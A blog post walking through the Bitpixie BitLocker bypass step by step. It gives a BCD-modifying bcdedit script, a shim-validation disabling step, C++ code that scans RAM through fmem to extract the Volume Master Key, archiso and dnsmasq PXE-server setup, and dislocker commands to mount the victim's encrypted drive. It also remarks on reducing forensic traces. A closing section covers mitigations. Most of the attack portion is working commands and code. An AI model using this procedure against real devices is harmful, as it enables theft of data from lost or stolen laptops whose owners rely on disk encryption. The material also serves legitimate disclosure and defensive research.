---
title: Bypassing Bitlocker using BitPixie with any Linux Kernel
date: 2026-08-31
description: Bitpixie allows on Systems using clear TPM to leak the bitlocker encryption key, by forcing a PXE boot to fail at a specific step and booting into anther operating system directly afterwards to read the RAM contents of the System.
draft: false
tags:
  - Bitlocker
  - BitPixie
toc: false
authors:
  - Julian Engel
---

## Abstract

Bitpixie allows, on systems using clear TPM, to leak the bitlocker encryption key, by forcing a PXE boot to fail at a specific step and booting into anther operating system directly afterwards to read the RAM contents of the System.

## The Technical Basis for BitLocker and Bitpixie

To build an exploit means to understand the exploit. Thus, at first a small explanation of what BitLocker is and what went wrong is needed.

### Demystifying Bitlocker and Secure boot

Firstly, Bitlocker is Microsoft's device encryption that has been rolled out on all devices since [Windows 11 version 24H2](https://learn.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-bitlocker#bitlocker-automatic-device-encryption-hardware-requirements). For private users it's called device encryption, in the corporate world it's called BitLocker. For simplicity's sake, this article will only be referring to it as BitLocker.

BitLocker has two keys. First, it has the **VMK** (*Volume Master Key*), which is protected TPM measurements and optional security measures like PIN, password, smart card, etc. With clear TPM referring to the configuration of only requiring the TPM to unseal the **VMK**.

The disk is decrypted with the **FVEK** (*Full Volume Encryption Key*). Which is decrypted using the **VMK**. This is also explained in some greater detail in one of the [Neodyme blog posts](https://neodyme.io/en/blog/bitlocker_screwed_without_a_screwdriver/#bitlocker-how-does-it-even-work).

### What went wrong in case of Bitpixie

What went wrong in case of Bitpixie is straight forward: normally, if a boot-step fails, keys in memory get wiped. This fails in Bitpixie's case. When a PXE boot fails, after unsealing the disk via the TPM, the **VMK** does not get wiped from memory but instead remains there. Thus allowing Software that boots afterwards to recover the **VMK** by reading out the RAM.

## Preparing your Tooling

All following steps of the preparation except the Target preparation have to be done only once (with some slight modifications, that is).

### Preparation of the Target

These target preparations can be quickly done. Firstly, two USB sticks should be ready. One only needs enough capacity for roughly one megabyte, while the other one should have more than 8 GB space and USB 3.0 support. Though theoretically, both things could be done over the network as well.

#### Obtaining a working BCD file

The easiest way to get the state needed for Bitpixie is using a BCD file. Since the GUID (*Globally Unique Identifier*) differs from hard drive to hard drive, a new BCD has to be obtained for every device that is to be attacked.

This can be achieved by running the following script from the smaller USB Stick via the system rescue terminal on the victim PC. Thus not requiring a login. Though there are some [other approaches](https://github.com/andigandhi/bitpixie?tab=readme-ov-file#extracting-the-bcd-file) out there that use a network connection.

```batch
bcdedit /export BCD_modded

bcdedit /store BCD_modded /create /d "softreboot" /application startup>GUID.txt
For /F "tokens=2 delims={}" %%i in (GUID.txt) do (set REBOOT_GUID=%%i)
del GUID.txt
bcdedit /store BCD_modded /set {%REBOOT_GUID%} path "\shimx64.efi"
bcdedit /store BCD_modded /set {%REBOOT_GUID%} device boot
bcdedit /store BCD_modded /set {%REBOOT_GUID%} pxesoftreboot yes

bcdedit /store BCD_modded /set {default} recoveryenabled yes
bcdedit /store BCD_modded /set {default} recoverysequence {%REBOOT_GUID%}
bcdedit /store BCD_modded /set {default} path "\\"
bcdedit /store BCD_modded /set {default} winpe yes

bcdedit /store BCD_modded /displayorder {%REBOOT_GUID%} /addlast
```

The script is taken from [the blog neodyme blog](https://neodyme.io/en/blog/bitlocker_screwed_without_a_screwdriver/#step-2-unlock-bitlocker-by-serving-a-correct-enough-boot-configuration).

##### Script breakdown

The following line sets the option for a soft reboot, meaning that power to the RAM is not lost during the reboot, thus not clearing the VMK.

```batch
bcdedit /store BCD_modded /set {%REBOOT_GUID%} pxesoftreboot yes
```

For the Boot to fail the following line is needed. Since the path supplied is does not exists but still passes the validation. Thus leaving the BCD broken in a way that forces the windows Bootloader to load the recovery option after unsealing the VMK from the TPM.

```batch
bcdedit /store BCD_modded /set {default} path "\\"
```

The fallback option is set to your Linux boot option using the following lines.

```batch
bcdedit /store BCD_modded /set {%REBOOT_GUID%} path "\shimx64.efi"
...
bcdedit /store BCD_modded /set {default} recoveryenabled yes
bcdedit /store BCD_modded /set {default} recoverysequence {%REBOOT_GUID%}
```

#### Disabling SHIM verification

This step allows one to boot any insecure kernel, without breaking the secure boot chain of trust and avoid getting an SBAT violation. First boot into a Linux distribution that has a signed SHIM from Microsoft. Fedora would be one such option.

Once booted into the system, the following command needs to be executed in a terminal:

```shell
sudo mokutil --disable-validation
```

The password afterwards is only needed once, so a simple one to remember suffices.

After setting the password a reboot is needed. A blue splash screen should appear with the title MOK Management (see [Ubuntu wiki](https://wiki.ubuntu.com/UEFI/SecureBoot/DKMS#:~:text=Open%20a%20terminal%20%28Ctrl%20%2B%20Alt%20%2B%20T%29%2C,had%20selected%20in%20Step%202%20and%20press%20Enter.) for screenshots), the Option to change the Secure boot state and is then used to disable Secure boot in shim signed. Here the password is needed.

This adds another step and some more possible traces, which makes the exploit simpler. By removing the need for a specific Linux Kernel, as well as allowing the usage of tools like [GitHub - NateBrune/fmem: Linux Kernel](https://github.com/NateBrune/fmem), [GitHub - 504ensicsLabs/LiME: LiME](https://github.com/504ensicsLabs/LiME) or `/dev/Ram`.

The traces left behind are NVRAM entries for booting linux as well as the entry that disables SHIM validation if not re enabled.

The process to enable validation once again is the same as it was for disabling validation, just the command in Linux changes to :

```shell
sudo mokutil --enable-validation
```

This gets rid a "Booting in insecure mode" message when booting Linux and makes forensics a bit harder.

### Preparing the Live System

The choice for the Linux base fell onto Arch Linux, simply because it had a large amount of good documentation. Though any distro works for this.
Most of the operations will be done in the initramfs, reducing the chance of overwriting the VMK in memory and reducing the amount of Data that needs to be transferred via TFTP.

#### Writing the exploitation binary

The exploit binary that is loaded into the initramfs that reads out the RAM contents is using the same detection to find the VMK introduced in the [38c3 Talk bitlocker screwed without a screwdriver](https://media.ccc.de/v/38c3-windows-bitlocker-screwed-without-a-screwdriver). The only modification to the original validation code, is the fixing of a comparison to prevent segfaulting in cases where a VMK needle is not found.

The following code snippet also writes the VMK to the filesystem to allow for easier decryption using dislocker.

```cpp
bool finding_key(void* data, size_t len) {
  void* hardware_address_possible_pmd = memmem(data, len, "-FVE-FS-", 8);
  // 
  if(hardware_address_possible_pmd == NULL){
    std::cout << "[-] Key '-FVE-FS_' NOT FOUND SKIPPING" << std::endl;
    return false;
  }

  uint32_t version = *(uint32_t*)(hardware_address_possible_pmd + 8+4); 
  uint32_t start = *(uint32_t*)(hardware_address_possible_pmd + 8+4+4);
  uint32_t end = *(uint32_t*)(hardware_address_possible_pmd + 8+4+4+4);
  // Version or size mismatch 
  if(version != 1 || end <= start){
    std::cout << "[-] VERSION or SIZE mismatch, " << version << start << end << std::endl;
    return false;
  }

  // the correct FVE KEY table header was found searching for the specific key
  void* pmd_vmk_add = memmem(hardware_address_possible_pmd, end, "\x03\x20\x01\x00",4);
  if(pmd_vmk_add == NULL){
    std::cout << "[-]  " << std::endl;
      return false;
  }
  std::cout<<"[+] found needle at :" << pmd_vmk_add << std::endl;
  //printing out all of the bytes till the end after the start of the key
  for(int i=0; i<(end-start); ++i){
    std::cout << std::setw(2) << std::setfill('0') << std::hex << *(int*) (pmd_vmk_add+i) << " " ;
      }
  std::cout << std::endl;
  std::cout << "--- END of dump ---" << std::endl;

 
  char* vmk = static_cast<char*>(pmd_vmk_add +4);
  std::cout << "[+] found key at " << vmk << std::endl;
  std::cout << "[+] We are In" << std::endl;
  //printing out the key
  for(int i=0; i< 32; ++i ){
    std::cout << *(vmk+i) << " " ;
  }
  std::cout << std::endl;

  //creating a backup file
  FILE *fp;
  fp = fopen("vmk.dat", "w");
  if(fp==NULL){
    std::cerr << "Error opening file "<<std::endl;
    // we still return true since we had success in finding the key
    return true;
  }
  fwrite(vmk,sizeof(char), 32, fp);
  
  fclose(fp);
  
  return true;
  
  }
```

Though the above-shown code does not read out the RAM content, it simply searches a given buffer for the key. To actually read out the contents,the kernel module [fmem](https://github.com/NateBrune/fmem) is used. Below is the main logic of the exploitation binary reduced to the smallest it can be using fmem.

```cpp
//... 
std::ifstream file_descriptor;
file_descriptor.open("/dev/fmem", std::ios::in | std::ios::binary);
// len and amount theoretically could be choosen by the user or hardcoded
size_t len= 2000000; //should be around 2MB
size_t amount = 10

char* buffer = new char[len];

//...
// simply iterating through memory to not overwrite the value, so its done in chunks
for(unsigned long long i = 0 ; i<amount; ++i){
 file_descriptor.read(buffer,len);
 //...
    if(finding_key(buffer, len)){
      std::cout << "[+] KEY FOUND" << std::endl;
      break;
```

#### Building the Arch Linux based live System

Information on how to build the arch ISO can be found in the wiki entry [archiso - ArchWiki](https://wiki.archlinux.org/title/Archiso). Running the following commands requires access to the Arch Repositories because the [archiso package](https://archlinux.org/packages/extra/any/archiso/) is used in this process.

Once the package is installed, a copy of the base image into a working directory so that the following modifications can happen. The relang base image is used as a base image.

```shell
cp -r /usr/share/archiso/configs/releng/ archlive
```

##### Creating a Package for FMEM

The `fmem` kernel is needed in the initramfs. Since it's not in the normal repositories, a local repository needs to be created. A PKGBUILD file can be found [here](https://github.com/SpezialK-dev/PKGBUILD/tree/master/fmem). To create the repository, the following commands need to be run in the same directory as the PKGBUILD file:

```shell
makepkg
repo-add -n fmem.db.tar.xz *.pkg.tar
```

First build the package and then creat a repository based on that package.

##### Pacman Config

Since the normal Arch Linux ISO does not come with all the dependencies needed to not only do the exploit but also to decrypt the disk, they will have to be added manually. Hence, the following package entries need to be added to the packages file (`packages.x86_64)`.

```
fuse2
mbedtls
cmake
make
ruby
ntfs-3g
dislocker
fmem
```

Since some of the packages mentioned above are not in the base Arch Linux repositories but the BlackArch repository, it as well as the custom `fmem` repository have to be added to the `pacman.conf` of the Arch ISO. To do that, simply add the following entries while making sure the path for the `fmem` entry is adapted.

```
[blackarch]
SigLevel = Never 
Server = https://www.blackarch.org/blackarch/$repo/os/$arch

[fmem]
SigLevel
Server= file://<full path from / to that specific Direcotry inside the arch iso>
```

##### Initramfs customization

To make the installed tools available in the initramfs the following file needed some modifications `$WorkingDir/relang/airootfs/etc/mkinitcpio.conf.d/archiso.conf` so that it contains these changes.

```
MODULES=(fmem)
BINARIES=(dislocker /etc/<name of the exploit binary>)
```

The first line will add the fmem kernel module, and the second line, the dislocker binary as well as the exploitation binary. The path of the exploit binary is relative inside the ISO, so the paths is relative to the `/etc/` in the working directory! Not the global `/etc/`!

### Preparing the attacker setup

The only thing left ist the setup of the attacker system. This has to be done only once.
Once again the recommendation is to use a Linux system.

#### Obtaining an outdated Windows Bootloader

Since the exploit is patched in newer versions, there is a need to obtain an old, vulnerable bootloader. One way to obtain an old, vulnerable ISO and extract the files needed. A list of vulnerable versions can be found in the [advisory](https://nvd.nist.gov/vuln/detail/CVE-2023-21563).
To extract the files the ISO can either be mounted locally or software that allows extracting files from ISO's can be used.

The file `bootmgfw.efi` can be found as `bootx64.efi` under `windows-mount-location/efi/boot/` and needs to be renamed to `bootmgfw.efi` and the `bootmgr.efi` file can be found under `windows-mount-location/bootmgr.efi`.

Optionally one can also obtain some fonts, that make debugging in certain cases a bit easier, but strictly speaking they are not needed. The fonts in question would be `wgl4_boot.ttf` as well as `segoe_slboot.ttf` as suggested in [this public bitpixie exploit by Andreas Grasser](https://github.com/andigandhi/bitpixie/tree/main/pxe-server). Alternatively the entire ISO could be extracted into the TFTP-root.

#### Server Setup

As a PXE server `dnsmasq` is used, since it has all the needed functionality.

##### DNSMASQ Config

The Dnsmasq config could look as follows. The interface address and the path to the TFTP-root have to be adapted to suit the specific setup. Other than that, no other modifications are needed.

```bash
# Only listen to routers' LAN NIC. Doing so opens up tcp/udp port 53 to localhost and udp port 67 to world:
interface=<your ethernet Interface >

# dnsmasq will open tcp/udp port 53 and udp port 67 to world to help with dynamic interfaces (assigning dynamic IPs).
# dnsmasq will discard world requests to them, but the paranoid might like to close them and let the kernel handle them.
# You may also need this option if you have other instances of dnsmasq running (eg. because of libvirtd)
bind-interfaces

# Set default gateway
dhcp-option=3,0.0.0.0

# Set DNS servers to announce
dhcp-option=6,0.0.0.0

# If your dnsmasq server is also doing the routing for your network, you can use option 121 to push a static route out.
# x.x.x.x is the destination LAN, yy is the CIDR notation (usually /24), and z.z.z.z is the host which will do the routing.
dhcp-option=121,x.x.x.x/yy,z.z.z.z

# Dynamic range of IPs to make available to LAN PC and the lease time. 
# Ideally set the lease time to 5m only at first to test everything works okay before you set long-lasting records.
# The range of addresses here must lie within the address range assigned to the virtual interface.
dhcp-range=192.168.0.50,192.168.0.100,12h

#tft things 
enable-tftp
tftp-root=<the path to the tftp root>/tftp-root/

dhcp-boot=bootmgfw.efi
```

So that the config can just be placed under `/etc/dnsmasq` with the needed changes.

##### TFTP Root

In the TFTP-Root the following files are needed for the exploit to work.

```ascii
/tftp-root
|- bootmgfw.efi
|- grubx64.efi
|- initramfs-linux.img
|- shimx64.efi
|- mmx64.efi
|- shimx64.efi.dualsigned
|- vmlinuz-linux
|- /Grub
 |- grub.cfg
|- /Boot
 |- BCD
|- /EFI/
 |- /Microsoft/Boot/
  |- bootmgfw.efi
  |- /Fonts
   |- segoe_slboot.ttf
   |- wgl4_boot.ttf
```

The `vmlinuz-linux` (*Linux Kernel*) as well as the `initramfs-linux.img` (*InitramFS*) can be obtained similarly to how the Windows bootloader was obtained, by simply extracting them from the ISO built previously.

The `mmx64.efi` and the `shimx64.efi` need to be signed and can be simply obtained from any Linux distro like Debian or Fedora. The Grub files need to match the chosen shim.

The filename of the Shim may need to be adjusted so that it matches `shimx64.efi`, since that is specified in the BCD file at the top.

- [Ubuntu grub](https://archive.ubuntu.com/ubuntu/dists/focal/main/uefi/grub2-amd64/)
- [Ubuntu SHIM](https://packages.ubuntu.com/noble/shim-signed)

The grub config file should simply look like this:

```cfg
menu entry "bitunlocker" {
 set gfxpayload=keep
 linux   vmlinuz-linux
 initrd  initramfs-linux.img
 }
```

## Going Through with the Exploit

The following is a description of a flow to run the exploit.

To configure the ethernet interface correctly one needs to run the following commands on the Linux attack System.

```shell
sudo ip link set <the ethernet Interface >
sudo ip address add 192.168.0.1/24 dev <the ethernet Interface > 
```

After that has been configured, dnsmasq can be started.

```shell
sudo dnsmasq -d 
```

The `-q` flag lets dnsmasq run as a non-demonized service so that it is easier to see problems in the setup.

Since the service is now running the Victim can be PXE booted, to run the exploit. If this cannot be done via the BIOS (because of a BIOS password is set or similar), one can simply boot into Windows Recovery by holding down the shift key while pressing on reboot on the Windows login screen. From there, one simply has to select the PXE in the alternative boot medium selection screen.

Once the initramfs has loaded, the fmem kernel module has to be loaded with the following command.

```shell
modprobe fmem
```

Once that is done, the exploitation binary can be run. The result should be a `vmk.dat` file.

To find out what Partition the `lsblk` command can be used, usually the encrypted partition should be the largest one.

The the encrypted partition can be mounted and decrypted with the following commands:

```shell
modprobe fuse 
mkdir bitlocker
dislocker -V <PARTITION> -K vmk.dat -vvv -- bitlocker
mkdir mnt 
mount -t ntfs-3g -o loop bitlocker/dislocker-file mnt
cd mnt 
```

## Mitigation

If Microsoft's recommendation for protection against an [attacker with skill and lengthy physical access](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/countermeasures#attacker-with-skill-and-lengthy-physical-access) is already being followed, then this attack will not work, since the **VMK** is only unsealed once the correct PIN is entered in.

Pre-boot authentication is one of the most effective methods to protect against outside decryption attacks against a laptop. Since this also prevents an attack from other possible BitLocker bypasses, such as unscrewing the lid and [sniffing the TPM](https://pulsesecurity.co.nz/articles/TPM-sniffing) communication with the CPU. It is also what Microsoft [recommends](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/countermeasures#preboot-authentication) against DMA (Direct Memory Access) and memory remanence attacks.

Otherwise, deploying [KB5025885](https://support.microsoft.com/en-us/topic/kb5025885-how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023-24932-41a975df-beb2-40c1-99a3-b3ff139f832d#bkmk_mitigation_guidelines) is also an option that would prevent Bitpixie. What this mitigation does is first add the "Windows UEFI CA 2023" to the trusted certificates in the motherboard database. After that is done, it adds the "Windows Production PCA 2011" certificate to the revocation list, thus not allowing the downgrade attack and preventing this attack entirely. While doing this, one should, of course, make sure that their bootloader is already signed with the new certificate and not with the old one. The [mitigation post from Microsoft](https://support.microsoft.com/en-us/topic/how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023-24932-41a975df-beb2-40c1-99a3-b3ff139f832d#bkmk_mitigation_guidelines) goes into greater detail on how to apply this patch.

Theoretically, one could also disable the network stack and PXE boot, that would also prevent BitPixie. Though some motherboards seem to reactivate PXE boot as soon as a USB-to-Ethernet adapter is connected. Hence, making this in some cases bypassable. While this has been [reported](https://neodyme.io/en/blog/bitlocker_screwed_without_a_screwdriver/#mitigation), it is highly dependent on hardware and thus is not always the case.

What does not fix the problem is simply deactivating third-party certificates in the BIOS so that a SHIM won't load, and only Microsoft Windows can be booted. Even though this implementation uses Linux to read out the RAM, other people have also done the same with a [Windows PE environment,](https://github.com/martanne/bitpixie) completely bypassing the need to use a third-party Microsoft certificate. Hence, making this venue of defense not viable. A blog post written about this can also be found on [Marc Tanner's blog](https://blog.compass-security.com/2025/05/bypassing-bitlocker-encryption-bitpixie-poc-and-winpe-edition/).
